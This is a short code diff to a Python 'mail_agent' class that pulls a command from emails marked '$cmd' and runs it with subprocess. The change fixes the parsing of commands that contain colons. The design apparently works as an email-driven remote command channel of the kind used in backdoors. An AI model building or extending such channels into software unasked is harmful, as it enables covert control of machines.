@@ -45,7 +45,7 @@ class mail_agent:
                 msg = email.message_from_bytes(response_part[1]).as_string().split('\n')
                 for line in msg:
                     if "$cmd" in line:
-                        command = line.split(':')[1]
+                        command = ":".join(line.split(':')[1:])
                         break
 
         proc = subprocess.Popen(command.split(), stdout=subprocess.PIPE)
